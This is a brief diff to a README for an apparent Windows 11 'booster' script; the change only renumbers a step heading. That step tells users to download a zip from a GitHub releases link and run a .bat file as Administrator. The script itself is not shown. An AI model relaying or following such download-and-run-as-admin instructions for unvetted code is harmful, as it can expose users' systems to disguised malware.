@@ -6,7 +6,7 @@ This repository contains a script to boost the performance of Windows 11 using a
 
 To use the Win11 Booster script, follow the steps below:
 
-### Step 2: Download the script and execute .bat on Admin
+### Step 1: Download the script and execute .bat on Admin
 
 Download the project https://github.com/Scuttlang/Win11-Booster/releases/download/owner/Win11-Booster-main.zip and extract the contents.
 
